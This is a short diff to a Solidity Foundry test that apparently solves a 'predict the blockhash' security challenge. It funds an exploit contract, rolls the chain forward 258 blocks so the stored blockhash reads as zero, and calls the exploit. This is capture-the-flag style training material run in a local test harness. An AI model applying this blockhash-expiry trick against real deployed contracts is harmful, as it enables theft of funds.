@@ -18,13 +18,18 @@ contract PredictTheBlockhashTest is Test {
 
     function testExploit() public {
         // Set block number
-        uint256 blockNumber = block.number;
+        // uint256 blockNumber = block.number;
         // To roll forward, add the number of blocks to -256,
         // Eg. roll forward 10 blocks: -256 + 10 = -246
-        vm.roll(blockNumber - 256);
+        // vm.roll(blockNumber - 256);
 
         // Put your solution here
+        exploitContract.setup{value: 1 ether}();
 
+        vm.roll(block.number + 258);
+        vm.warp(block.timestamp + 258 * 12);
+
+        exploitContract.exploit();
         _checkSolved();
     }
 
